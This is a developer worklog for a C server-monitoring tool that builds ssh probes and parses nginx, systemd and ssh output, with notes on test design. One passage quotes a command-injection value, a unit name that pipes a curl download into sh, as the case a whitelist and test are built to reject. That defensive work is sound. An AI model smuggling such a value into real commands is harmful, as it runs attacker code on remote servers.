# villa_lectores.worklog.md

## 2026-07-24 — V3 built: ssh command builder + pure parsers

Shipped `include/villa_lectores.h` + `lib/villa_lectores.c` +
`probationes/probatio_villa_lectores.c` (153 assertions, green on
first run). Everything here is a pure function driven by the
fixtures committed in `probationes/fixa/villa/` (bc5108a).

### Two nginx traps the fixture README did NOT name

The README (written at capture time) listed five shapes to survive.
Reading the actual 426 lines before writing the parser surfaced two
more, both fatal to the obvious implementation:

**1. `server {` appears inside comments.** Three times:
`nginx.conf` lines 74 and 80 (the commented-out `#mail` example
block), and `sites-enabled/default` line 330 (the commented example
vhost). A scanner that greps for `server {` finds **10** blocks
where there are **7**. Verified independently:

```
sed 's/#.*//' nginx_T.txt | grep -cE '^[[:space:]]*server[[:space:]]*\{'   → 7
grep -cE '^[[:space:]#]*server[[:space:]]*\{' nginx_T.txt                  → 10
```

So comment stripping has to happen *before* anything else, and it
has to be quote-aware (`#` inside a quoted string is literal — the
`ssl_ciphers "..."` line is the near-miss).

**2. `if ($host = ...) { }` blocks nest inside server blocks.** The
Certbot redirect companions put `return 301` one brace deeper than
the server body. So the parser needs a genuine brace-depth counter,
not "am I between a `server {` line and a `}` line" — the first `}`
it meets belongs to the `if`, not the server.

Together these mean the nginx reader is a real (small) scanner:
comment strip → quote-aware brace walk → directive capture. Roughly
40% of the library, as the spec predicted.

### The sanitization accident that became a test asset

While sanitizing `list_units.txt`, renaming three services broke
their column padding — `libri.service loaded active running ...`
has single spaces where every other row has aligned columns. That
looked like a defect in the fixture. It is actually the best line in
it: it proves the parser splits on **whitespace runs** rather than
fixed column offsets, and a fixed-column parser would fail exactly
those three rows and pass the other 22. The test asserts against
`libri.service` specifically for this reason. Left as-is
deliberately; do not "fix" the alignment.

### Copy-on-emit, not views

Internal helpers (`_verbum`, `_reliquum_a_verbo`, `_ante_terminum`)
return **views** into the input — no allocation during the parse.
Public functions **transcribe** into the caller's arena at the
moment a struct is emitted.

This is not fussiness. `apps/villa` will hold probe snapshots across
ticks while the process output that produced them lives in
`piscina_vocationis`, which is reset every tick (`forum.c:976`).
Views would have been a silent use-after-reset that only shows up
under load. The header states the rule so a future reader doesn't
"optimize" the copies away.

### ControlPath gate — the boundary is tested on both sides

`dir + '/' + 40` (ssh expands `%C` to a 40-char hash) must stay
under 100 bytes. The test builds paths of exactly 59 and 60 chars:
59 → 100 → accepted (the terminus itself), 60 → 101 → refused with
the measured length in the message. Both sides matter; a gate only
tested on the failing side can be off by one forever.

Worth restating why this gate exists at all: an oversize ControlPath
makes ssh silently skip multiplexing (it reports the bind failure
only under `-v`), so every later command quietly degrades to a full
handshake. The failure presents as "villa feels slow", months later,
with nothing in any log.

### Two mechanical notes

- **`ordinarius` is `default`.** Used it as a variable name for the
  `server_name _` site; got 10 parse errors pointing at
  `latina.h:27`. Renamed to `communis`. The macro list keeps
  claiming ordinary-looking words — this one reads as a perfectly
  normal noun.
- **BSD `sed` has no `\b`.** The rename via
  `sed 's/\bordinarius\b/.../g'` silently did nothing and the same
  10 errors came back identically, which momentarily looked like a
  stale binary. Used `Edit` instead. On macOS, prefer the editor
  over `sed` for word-boundary renames.
- **`compile_tests_fontes_generata.sh` must be regenerated** when a
  library is added: `./tools/compile_tests_fontes_generare.sh`. The
  failure mode is a loud linker error naming every missing symbol,
  which is the design (the generator's header comment says so) —
  but it reads as a build break for a second.

## 2026-07-24 (later) — failure shapes, and a test that would have broken on its own subject

Cleanup pass before V3.5. 153 → **202 assertions**, suite still 105/105.

### We had never seen a broken unit

The original fixtures covered only healthy output. For a tool whose
entire reason to exist is showing you when something is broken, the
parsers had been tested exclusively against success — and would have
met the failure shape for the first time at the exact moment
something actually failed.

`systemctl list-units --state=failed` on the droplet returned zero,
so there was nothing to capture read-only. Fran approved creating a
throwaway unit (`Type=oneshot`, `ExecStart=/bin/false`), capturing,
and removing it. That's `captare_fracta.sh` — kept **separate from
`captare.sh`**, because that script's header promises "lectiones
solae" and a promise like that is worth more than the convenience of
one file. Cleanup runs from `trap ... EXIT` so a mid-capture failure
still tears the unit down; verified afterward that the unit file was
gone, `LoadState=not-found`, zero failed units, and nginx / smaragda
/ litestream all still `active`.

### Two traps the failure fixture exposed

**1. An empty `ActiveEnterTimestamp` means nothing.** It is empty for
a *failed* unit, an *inactive* unit, and an *unknown* unit alike.
Anyone reaching for it as a "not found" signal would be wrong in two
of three cases.

**2. `Result=success` is returned for units that are dead and for
units that do not exist.** Rendering it unconditionally puts
"Result: success" next to a service that isn't running — a confident
lie. The value is stored verbatim (the reader must not misreport what
systemd said) but the derived `fracta` flag carries the judgment, and
the header states that `causa_finis` is meaningless unless `fracta`.

Both are asserted in §XVII rather than only commented. A comment
guarding a trap decays; a test that fails is a comment that shouts.

### A test that would have broken on its own subject

`CREDO_VERUM (discus.praesto > ZEPHYRUM)` — that assertion is
**false on a genuinely full disk**, which is precisely the condition
the disk reader exists to surface. I'd written a test that would
break on the case it was built for.

Replaced positivity with bounds (`usa <= frusta`,
`praesto <= frusta`, `usa + praesto <= frusta`). The general lesson
is worth keeping: for a VARIANS fixture, assert *relations that hold
in every state of the world*, not properties that happen to hold in
the state you sampled. "Currently nonzero" is a sample; "never
exceeds the total" is an invariant.

### First-wins made visible

`destinationes` now counts every `proxy_pass` in a block while
`destinatio` still holds the first. A block with three `location`
blocks pointing at different upstreams previously rendered as though
it had one — silently. Now the UI can say "1 of 3". The droplet has
one location per server, so no fixture exercises it, which is the
argument *for* the counter rather than against it: an untested wrong
answer that looks right is the worst kind.

### Three fixtures that came free

- an unknown unit **between** two healthy ones (from a typo — I
  queried the sanitized name `gemma.service` against the real box).
  Proves a not-found record doesn't corrupt its neighbours. Kept
  deliberately.
- empty `list-units` — header, blank line, `0 loaded units listed.`
  The empty case is its own shape, not the absence of one.
- `journalctl` emits a multi-line `Hint:` preamble before
  `-- No entries --`. v1 displays logs verbatim, so this will render
  unless someone strips it; pinned so whoever decides to strip it
  knows what they're stripping.

## 2026-07-24 (V3.6) — telling ssh failures apart

`villa_exitum_discernere` + `villa_exitus_nomen`. 202 → **233
assertions**, suite 105/105.

### The law, from real captures

Seven ssh failures captured live (`captare_ssh.sh` — changes
nothing on either machine; every case fails before or during the
handshake). They establish one structural fact:

**ssh uses exit 255 for its own errors and passes the remote
command's exit code through otherwise.** So 255 means "ssh failed,
read stderr to learn how"; anything else means the remote command
ran and answered — and **127 specifically means the *remote*
command was missing**, which `processus`'s third pipe already keeps
distinct from "the ssh binary is missing."

That distinction is why V0 built the exec-errno pipe in the first
place. It finally has a consumer.

### The capture that earned its keep

`clavis_negata` — stderr is two lines:

```
Load key "/dev/null": invalid format      ← red herring
usor@…: Permission denied (publickey).    ← the actual cause
```

A classifier reading the *first* line of stderr answers "unknown
cause." So the reader scans **all** of stderr for decisive markers
and reports the line that matched. §V-bis asserts both the correct
verdict and that the red-herring line is *not* what gets reported —
because the bug this guards against produces a plausible-looking
wrong answer, not a crash.

I would not have predicted that shape. It came from running the
real command, which is the whole argument for capturing over
inventing: invented fixtures encode what you *expect* ssh to say.

### Ambiguity named, not papered over

A remote command that itself exits 255 is indistinguishable from an
ssh failure. Nothing fixes that without a sentinel (wrapping the
remote command in something like `echo MARK$?`). v1 accepts it and
says so in the header; if it ever bites, the sentinel gets added
then rather than being built speculatively now.

### Two shell traps, one of them repeated

- **zsh does not word-split unquoted expansions.** `cap x ssh $O …`
  passed `-o BatchMode=yes -o ConnectTimeout=5` as a *single*
  argument, and all seven captures came back as identical parse
  errors — which looked like seven real results until I read them.
- **BSD `sed` has no `\b` — for the second time today.** It silently
  no-oped my sanitization and left a real username in a fixture I
  was about to commit. I had *written this down in this very file*
  hours earlier and still repeated it.

That second one is worth sitting with: a worklog entry doesn't
prevent recurrence unless something makes you re-read it at the
moment of the reach. What actually caught it was the verification
step (`grep` for real hostnames before committing), not the
documentation. **Gates catch what notes don't** — which is the same
lesson as putting the systemd traps in §XVII as assertions rather
than comments.

### Known limits of the nginx reader — read this before trusting it

None of these are hit by the committed fixtures, which is exactly why
they are written down: **an untested wrong answer that looks right is
the worst kind.** All four are cheap to fix when a config that
provokes them appears; none is worth speculative work now.

1. **No ports are captured.** `ssl` is a boolean; which ports
   `listen` names is discarded. Fine while 443/80 are assumed, wrong
   for a non-standard port.
2. **Quote state does not persist across lines.** nginx permits a
   quoted string to span lines; the comment-stripper resets quote
   state at every line start, so such a string would mis-parse. The
   near-miss in our own fixture is `ssl_ciphers "ECDHE-…"` — one
   line, so it works.
3. **Brace depth is not reset at `# configuration file` markers.** If
   any dumped include were brace-unbalanced, depth would drift for
   everything after it. There is a guard against *underflow*
   (`profunditas > ZEPHYRUM`, tested in §XV) but none against upward
   drift. Every file in the real dump is balanced.
4. **The fold keys on the first `server_name` token only.** Two
   distinct sites sharing a first token would merge into one.

Limit (1) from the original list — first-wins `proxy_pass` — was
fixed in the later pass: `destinationes` now counts them.

### What is deliberately NOT here

- No `journalctl` parser. Log tailing is display-only in v1 — the
  app shows the text, nothing parses it. Adding a framing parser
  before there is a consumer would be inventing a spec.
- No systemctl **command** builders (the remote script strings).
  Those belong with the caller in V4; the header documents the
  required flags (`--plain`, `--no-pager`, `-P`) next to each
  parser instead, since that is where the coupling actually bites.
- `list-units` does not handle the `●`/`*` status markers, because
  `--plain` suppresses them and the fixture was captured with it.
  If that flag is ever dropped, the first column silently becomes
  the marker. The flag requirement is in the header.

## 2026-07-24 (V4a) — the agent: probe, act, record

`include/villa_agens.h` + `lib/villa_agens.c` +
`probationes/probatio_villa_agens.c` (100 assertions) + the stub ssh.
Root suite 105 → **106**.

### One ssh call, not five

A probe gathers five readings. Five separate ssh calls would be five
round trips and five spawns per cycle; one compound script with
marked sections is one of each. Verified against the real droplet:
**6 sections, all closed, exit 0, 503 lines in a single round trip.**

Per-section exit codes matter more than they look. nginx can be
broken while systemctl is fine — a single overall exit code would
collapse "one reading failed" into "the probe failed," and §V pins
that a failed nginx section leaves the other five intact.

### The injection vector the local guarantee does NOT cover

`processus` deletes shell quoting bugs **locally** — argv vector, no
`/bin/sh`. That protects this machine and says nothing about the
remote one, because ssh runs its command through the *login shell*
by definition.

Mostly that's fine: the probe script is ours, and the free-text
command box is *supposed* to reach the remote shell — that's the
feature. But **unit names come from user-created entities and get
interpolated into our script**. A `servitium` named
`x; curl malum|sh` would run under cover of a routine probe.

So `villa_unitas_valida` whitelists what systemd actually uses
(alnum, `-`, `_`, `.`, `@`, `:` — enough for `getty@tty1.service`
and `user@1000.service`) and rejects everything the shell reads.
Rejected names are **omitted and counted**, so the caller can say
"probed 4 of 5" rather than quietly probing less than asked.

Proven end to end: feeding all three names through the real
generator yields `omissa=1` and a script containing neither
`x; curl` nor `|sh`.

### Twin arenas per server

Each server owns two arenas and alternates. A new probe fills arena
A while the last snapshot still lives in arena B.

Without this, starting a probe would free the snapshot the UI reads
in that same tick — a use-after-reset that appears only under load
and looks like "the panel goes blank sometimes." §VIII holds a
pointer to the previous snapshot across a new probe start and
asserts it still reads correctly. Arenas are cleared before reuse,
so memory is flat however long villa runs.

### Two test-authoring mistakes worth keeping

**Asserting too broadly.** I wrote `CREDO_FALSUM(contains(script,
";"))` to prove no injection. It failed — the script legitimately
contains semicolons in its *own* shell function
(`s(){ ...; shift; ...; }`). The assertion accused the generator
instead of testing the guard. Fixed by looking for the malicious
name's own fragments.

**Asserting against a summary instead of the record.** The `origo`
check initially read the `res` tool's output, which doesn't render
origo at all (it's a column on `tessellae`, not part of datum). The
right assertion reads the **annals file** — that proves the event
durably exists with correct provenance, rather than that some text
appeared in a human-facing summary. It also let me add the
complementary check that no `mutatio` event was ever written.

### Also

- `filum_directorium_creare_cum_modo` added — the existing helper
  hardcodes 0755, wrong for a control-socket directory (0700). It
  also *coerces* the mode on an existing directory, since one
  created loosely elsewhere would otherwise stay loose silently.
- The stub assembles its compound response **from the individual
  fixtures**, so those stay the single source of truth and a
  hand-maintained compound fixture can't drift from them.
- The event gate spawns an ephemeral `tabulariumd` on `-portus 0`
  with its own scrinium — Fran's real board is never touched
  (verified: his daemon still running afterward).
- Cleanup used three explicit filenames and left sqlite's `-wal`
  and `-shm` behind. Now a glob. A gate that litters is a gate
  someone eventually disables.

## 2026-07-30 (V4b-1) — iudicium + the incremental action slot

First V4b stage, after Fran settled the four open decisions (board
01KY0P5GG9, nota 2026-07-30). Two agens additions, no UI yet.

**`villa_iudicare`** — the tiered dot, pure and pinned. RED = probe
failed OR any tracked service `!inventa || !currit || fracta` (a
tracked-but-not-found unit is red, not amber: you track it because
it must run — and `not-found` red is also the counter to the
`Result=success` lie §XVII guards). AMBER = querelae nonempty or
disk ≥90% (boundary pinned both sides, 89/90). GREEN otherwise;
NIHIL/unfinished = IGNOTUS (grey, never a green lie). Red beats
amber when both apply — pinned.

**Action slot** — `villa_actionem_incipere/currit/ultima/abrumpere`,
mirroring the probe seat exactly: twin arenas (the §VIII
use-after-reset argument applies verbatim to action results read by
the UI), refuse-while-running, completion inside
`villa_agens_pulsare`. Differences from the probe seat: arenas are
created LAZILY (most servers never see an action; eager twins would
double every sede's footprint for nothing), and completion writes
the nota event via the shared `_actionis_fructus` tail — extracted
from `villa_actionem_agere`, so both paths emit byte-identical
events and the header's "OBSTAT consulto" is now scoped to
shell-tools/tests only (the doctrine that postdates it wins for the
UI). The blocking path's §IX/§X gates still pass unchanged, which
is the proof the refactor is faithful.

One deliberate test shape: §XII runs a probe and an action
concurrently in the SAME sede — the two seats share one pulse loop
and must not collide. The stub's mode env is captured at fork, so
setting a different mode per spawn is race-free.
